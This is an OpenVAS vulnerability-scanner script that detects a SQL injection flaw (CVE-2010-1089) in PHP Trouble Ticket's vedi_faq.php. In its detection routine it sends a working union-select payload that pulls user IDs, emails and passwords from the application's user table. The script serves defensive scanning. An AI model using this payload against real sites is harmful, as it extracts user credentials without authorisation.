###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_phptroubleticket_sql_injection.nasl 14326 2019-03-19 13:40:32Z jschulte $
#
# Phptroubleticket 'vedi_faq.php' SQL Injection Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901101");
  script_version("$Revision: 14326 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:40:32 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-04-01 11:04:35 +0200 (Thu, 01 Apr 2010)");
  script_cve_id("CVE-2010-1089");
  script_bugtraq_id(38486);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Phptroubleticket 'vedi_faq.php' SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/38763");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/1003-exploits/phptroubleticket-sql.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause SQL
  Injection attack and gain sensitive information.");
  script_tag(name:"affected", value:"PHP Trouble Ticket 2.2 and prior");
  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
  via the 'id' parameter in vedi_faq.php that allows attacker to manipulate SQL
  queries by injecting arbitrary SQL code.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running PHP Trouble Ticket and is prone to SQL
  injection vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/phpticket", "/phpttcket", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/index.php",  port:port);

  if('Powered by phptroubleticket.org' >< res)
  {
    req = http_get(item:string(dir,"/vedi_faq.php?id=666/**/union/**/all/**/" +
                   "select/**/1,concat_ws(0x3a,id,email,password)kaMtiEz,3,4" +
                   "/**/from/**/utenti--"), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    if(eregmatch(pattern:"1:admin:.*", string:res))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);